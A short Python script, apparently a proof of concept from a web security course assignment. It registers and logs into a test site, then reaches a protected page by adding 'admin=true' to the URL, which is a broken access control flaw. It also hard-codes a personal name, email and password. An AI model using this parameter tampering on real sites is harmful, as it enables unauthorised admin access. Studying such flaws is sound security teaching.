import urllib, urllib2, cookielib
import os
import webbrowser
import hashlib
import requests

# for this test case, just set admin=true in url after registering account.


def sha512hash(plaintext):
    return hashlib.sha512(plaintext).hexdigest()
password = 'studentaZ0'
password = sha512hash(password)
username = "seowyanyi"
email = "seow.yanyi@gmail.com"

# do POST to the form to create account
values = dict(username=username, email=email, p=password)
data = urllib.urlencode(values)

register_url = 'http://www.wsb.com/Assignment2/case23/register.php'
req = urllib2.Request(register_url, data)
rsp = urllib2.urlopen(req)
content = rsp.read()

# login
values = {'email':email, 'p': password}
login_url = 'http://www.wsb.com/Assignment2/case23/includes/process_login.php'
r = requests.post(login_url, data=values)


bad_url = 'http://www.wsb.com/Assignment2/case23/protected_page.php?admin=true'
new = 2 #open in new window
webbrowser.open(bad_url,new=new)
